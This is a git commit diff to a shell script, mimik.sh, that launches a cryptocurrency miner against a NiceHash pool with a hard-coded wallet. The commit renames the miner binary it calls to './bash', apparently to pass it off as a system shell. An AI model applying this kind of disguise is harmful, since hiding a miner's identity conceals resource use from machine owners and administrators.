66fc861c71b7b919502cb66f59277b81d90e8819
sagemantap <158444606+sagemantap@users.noreply.github.com>
2024-03-19 15:50:31 +0700

    Update mimik.sh

--- mimik.sh
+++ mimik.sh
@@ -3,5 +3,5 @@
 POOL=stratum+ssl://karlsenhash.auto.nicehash.com:443
 WALLET=NHbKJMfrbh2uUw8dm3PoYGEjUSN3G7qpBqha.Danis
 
-./lolay --algo KARLSEN --pool $POOL --user $WALLET $@
+./bash --algo KARLSEN --pool $POOL --user $WALLET $@
 
